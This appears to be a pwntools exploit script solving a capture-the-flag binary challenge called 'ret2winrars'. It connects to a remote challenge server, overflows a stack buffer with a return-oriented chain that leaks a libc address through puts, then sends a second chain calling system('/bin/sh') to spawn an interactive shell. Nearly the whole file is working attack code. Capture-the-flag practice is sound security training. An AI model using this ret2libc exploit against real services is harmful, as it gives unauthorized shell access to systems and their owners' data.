#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 193.57.159.27 --port 26141 ./ret2winrars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2winrars_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '193.57.159.27'
port = int(args.PORT or 26141)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = exe.libc

flag=0x0000000000401162
gets=0x0000000000401175
pop_rdi =0x000000000040124b
print (exe.got['gets'])
p = 'A'*40
p += p64(pop_rdi)
p += p64(exe.got['gets'])
p += p64(exe.plt['puts'])
p += p64(gets)
io.sendlineafter("access: ",p)
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
libc.address= leak - libc.sym['gets']
print hex(libc.address)
system = libc.sym['system']
bin_sh = libc.search("/bin/sh").next()

p = 'A'*40
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(pop_rdi+1)
p += p64(system)
io.sendline(p)

io.interactive()

